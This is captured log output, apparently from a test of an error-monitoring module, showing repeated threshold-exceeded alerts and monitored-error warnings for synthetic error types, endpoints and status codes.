ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955686Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955734Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_9\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_9, /api/endpoint_59\nStatus Codes: 409, 459, 509, 559\nFirst Occurrence: 2025-07-05T15:23:43.683887\nLast Occurrence: 2025-07-05T15:23:43.955681'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955780Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4959'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.955830Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.955878Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_10\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_10, /api/endpoint_60\nStatus Codes: 560, 410, 460, 510\nFirst Occurrence: 2025-07-05T15:23:43.683940\nLast Occurrence: 2025-07-05T15:23:43.955824'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.955978Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4960'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956049Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956105Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_11\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_11, /api/endpoint_61\nStatus Codes: 561, 411, 461, 511\nFirst Occurrence: 2025-07-05T15:23:43.683993\nLast Occurrence: 2025-07-05T15:23:43.956040'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4961'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956208Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956259Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_12\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_12, /api/endpoint_62\nStatus Codes: 512, 562, 412, 462\nFirst Occurrence: 2025-07-05T15:23:43.684045\nLast Occurrence: 2025-07-05T15:23:43.956202'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4962'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956357Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956405Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_13\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_13, /api/endpoint_63\nStatus Codes: 513, 563, 413, 463\nFirst Occurrence: 2025-07-05T15:23:43.684098\nLast Occurrence: 2025-07-05T15:23:43.956351'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4963'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956501Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956549Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_14\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_14, /api/endpoint_64\nStatus Codes: 464, 514, 564, 414\nFirst Occurrence: 2025-07-05T15:23:43.684149\nLast Occurrence: 2025-07-05T15:23:43.956495'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4964'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956651Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956699Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_15\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_15, /api/endpoint_65\nStatus Codes: 465, 515, 565, 415\nFirst Occurrence: 2025-07-05T15:23:43.684199\nLast Occurrence: 2025-07-05T15:23:43.956646'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956745Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4965'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956795Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.956844Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_16\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_16, /api/endpoint_66\nStatus Codes: 416, 466, 516, 566\nFirst Occurrence: 2025-07-05T15:23:43.684249\nLast Occurrence: 2025-07-05T15:23:43.956789'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.956891Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4966'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.956943Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957021Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_17\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_17, /api/endpoint_67\nStatus Codes: 417, 467, 517, 567\nFirst Occurrence: 2025-07-05T15:23:43.684299\nLast Occurrence: 2025-07-05T15:23:43.956937'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4967'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957167Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957221Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_18\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_18, /api/endpoint_68\nStatus Codes: 568, 418, 468, 518\nFirst Occurrence: 2025-07-05T15:23:43.684352\nLast Occurrence: 2025-07-05T15:23:43.957158'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957270Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4968'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957321Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957371Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_19\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_19, /api/endpoint_69\nStatus Codes: 569, 419, 469, 519\nFirst Occurrence: 2025-07-05T15:23:43.684403\nLast Occurrence: 2025-07-05T15:23:43.957315'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4969'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957468Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957516Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_20\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_20, /api/endpoint_70\nStatus Codes: 520, 570, 420, 470\nFirst Occurrence: 2025-07-05T15:23:43.684453\nLast Occurrence: 2025-07-05T15:23:43.957463'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957564Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4970'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
ERROR    app.core.logging:error_monitoring.py:120 [2m2025-07-05T14:23:43.957620Z[0m [[31m[1merror    [0m] [1merror_threshold_exceeded      [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_triggered[0m=[35mTrue[0m [36mcount[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_check_alert_threshold[0m [36mlineno[0m=[35m120[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mthreshold[0m=[35m100[0m [36mwindow_minutes[0m=[35m60[0m
ERROR    app.core.logging:error_monitoring.py:151 [2m2025-07-05T14:23:43.957670Z[0m [[31m[1merror    [0m] [1merror_alert_triggered         [0m [[0m[1m[34mapp.core.logging[0m][0m [36malert_message[0m=[35m'ALERT: High error rate detected\nError Type: error_type_21\nCount: 100 errors in 60 minutes\nAffected Paths: /api/endpoint_21, /api/endpoint_71\nStatus Codes: 521, 571, 421, 471\nFirst Occurrence: 2025-07-05T15:23:43.684501\nLast Occurrence: 2025-07-05T15:23:43.957614'[0m [36menvironment[0m=[35mdevelopment[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35m_trigger_alert[0m [36mlineno[0m=[35m151[0m [36mmodule[0m=[35merror_monitoring[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.957718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m100[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4971'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
